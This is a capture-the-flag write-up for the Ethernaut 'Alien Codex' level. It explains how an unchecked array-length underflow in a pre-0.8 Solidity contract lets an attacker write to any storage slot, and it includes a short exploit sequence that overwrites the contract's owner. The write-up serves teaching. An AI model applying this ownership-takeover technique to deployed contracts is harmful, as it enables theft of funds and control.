# Level 19: Alien Codex

**Target:** [AlienCodex.sol](./AlienCodex.sol)

## Vulnerability

Array length underflow + storage slot collision. The `codex` dynamic array's length can be set to `type(uint256).max` via an unchecked decrement in `retract()`, giving write access to every storage slot in the contract — including slot 0, which holds the inherited `owner` variable.

## Key Concepts

**Dynamic array storage layout:** A dynamic array declared at storage slot `p` stores its length at slot `p`. Its elements are stored starting at `keccak256(p)`. Element `i` is at slot `keccak256(p) + i`.

**Underflow (pre-checks):** The contract uses Solidity `^0.5.0` where arithmetic does not revert on overflow. Calling `retract()` on a zero-length array sets `codex.length` to `2^256 - 1`, covering the entire 32-byte storage space.

**Storage slot 0 overlap:** `AlienCodex` inherits from `Ownable`. The `owner` address (20 bytes) and `contact` bool (1 byte) are packed together in slot 0. To overwrite `owner`, we need the array index `i` such that:

```
keccak256(1) + i ≡ 0 (mod 2^256)
i = 2^256 - keccak256(1)
```

In Solidity:
```solidity
unchecked {
    index = 0 - uint256(keccak256(abi.encode(uint256(1))));
}
```

## Exploit

```solidity
// 1. Unlock the contact gate
IExploit(target).makeContact();

// 2. Underflow the array length to 2^256 - 1
IExploit(target).retract();

// 3. Calculate the index that maps to slot 0
uint256 index;
unchecked {
    index = 0 - uint256(keccak256(abi.encode(uint256(1))));
}

// 4. Write our address into slot 0, overwriting owner
IExploit(target).revise(index, bytes32(uint256(uint160(msg.sender))));
```

No exploit contract needed — executed directly from a Foundry script.

## Root Cause

Two compounding issues: (1) no bounds check in `retract()` on a pre-0.8.0 compiler, and (2) `revise()` allows arbitrary writes to any index in the now-unbounded array. Together they turn a missing length guard into full storage write access.

## Real-World Reference

The same class of vulnerability — unchecked array manipulation enabling storage corruption — appeared in the **BatchOverflow** bug (2018) that affected multiple ERC20 tokens. Attackers could mint arbitrary token balances by passing carefully crafted `value * count` overflow pairs to batch transfer functions, bypassing the intended balance check.
